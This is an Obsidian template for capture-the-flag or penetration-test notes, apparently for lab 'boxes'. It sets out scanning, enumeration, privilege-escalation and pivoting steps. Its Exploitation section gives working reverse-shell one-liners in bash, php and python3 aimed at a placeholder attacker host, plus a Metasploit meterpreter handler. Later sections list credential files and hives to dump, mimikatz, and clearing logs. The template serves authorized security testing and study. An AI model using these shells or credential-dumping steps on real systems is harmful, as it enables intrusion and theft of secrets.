<%*
const box = await tp.system.prompt("Box name?");
const ip = await tp.system.prompt("Target IP?");
const domain = await tp.system.prompt("Domain (optional)?");
const ports = await tp.system.prompt("Open ports?");
const date = tp.date.now("YYYY-MM-DD");
%>

# <%* tR += box %> - Pentest Notes
**Date:** <%* tR += date %>

---

## ğŸ¯ Target Information
- **Box Name:** <%* tR += box %>
- **IP Address:** <%* tR += ip %>
- **Domain:** <%* tR += domain %>
- **Open Ports:** <%* tR += ports %>

---

## ğŸ” Reconnaissance & Footprinting

### Passive Recon
- whois <%* tR += domain %>
- dig ANY +noall +answer <%* tR += domain %>
- Google Dorks
- GitHub, social, pastebin OSINT

---

## ğŸ” Active Scanning
```bash
nmap -Pn -sC -sV -oN <%* tR += box %>_quick.nmap <%* tR += ip %>
nmap -p- -T4 -oN <%* tR += box %>_full_tcp.nmap <%* tR += ip %>
nmap -sU --top-ports 20 -oN <%* tR += box %>_udp.nmap <%* tR += ip %>
```

---

## ğŸŒ Web Enumeration
```bash
whatweb http://<%* tR += ip %>
gobuster dir -u http://<%* tR += ip %> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
nikto -h http://<%* tR += ip %>
```
- Check for SQLi, XSS, LFI/RFI
- File upload tests
- CMS detection

---

## âš™ï¸ Network Services Enumeration

### SMB
```bash
smbclient -L //<%* tR += ip %>/ -N
enum4linux -a <%* tR += ip %>
smbmap -H <%* tR += ip %>
```

### FTP
```bash
ftp <%* tR += ip %>
```

### SNMP
```bash
snmpwalk -v2c -c public <%* tR += ip %>
```

### NFS
```bash
showmount -e <%* tR += ip %>
```

---

## ğŸ’¥ Exploitation


### Reverse Shells
```bash
bash -i >& /dev/tcp/YOURIP/4444 0>&1
php -r '$sock=fsockopen("YOURIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOURIP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Metasploit Handler
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST YOURIP
set LPORT 4444
run
```

---

## ğŸ§¬ Shell Stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z â†’ `stty raw -echo; fg`
export TERM=xterm
alias ll='ls -la'
```

---

## ğŸ“ˆ Post-Exploitation Enumeration

### Linux
```bash
whoami; id; hostname; uname -a
ip a; ip route; arp -a
ps aux; netstat -tulnp
```

### Windows
```powershell
whoami /all
systeminfo
net users
net localgroup administrators
```

---

## ğŸ” Privilege Escalation

### Linux
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

### Windows
```powershell
whoami /priv
reg query HKLM /f password /t REG_SZ /s
```
- Unquoted service paths
- AlwaysInstallElevated
- SeImpersonatePrivilege (PrintSpoofer, JuicyPotato)

---

## ğŸ” Tunneling & Pivoting

### SSH
```bash
ssh -L 8080:internal:80 user@<%* tR += ip %>
ssh -R 9000:localhost:22 user@<%* tR += ip %>
ssh -D 9050 user@<%* tR += ip %>
```

### Proxychains
```bash
proxychains nmap -sT -Pn -n 10.10.1.10
```

### Chisel
```bash
chisel server -p 8000 --reverse
chisel client YOURIP:8000 R:1080:socks
```

---

## ğŸ§  Credential Hunting
- /etc/passwd, /etc/shadow
- config.php, wp-config.php
- .bash_history
- SAM, SYSTEM hive dumps
- mimikatz or secretsdump.py

---

## ğŸ“‚ Loot & Evidence
- Flags: user.txt, root.txt
- Hashes
- Screenshots
- Downloaded files
- Commands used

---

## ğŸ§¹ Cleanup
- Remove shells, binaries, accounts
- Clear history/logs if allowed

---

## âœ… Summary
- **Initial Access:** 
- **Privilege Escalation:** 
- **Data Exfiltrated:** 
- **Notes:** 
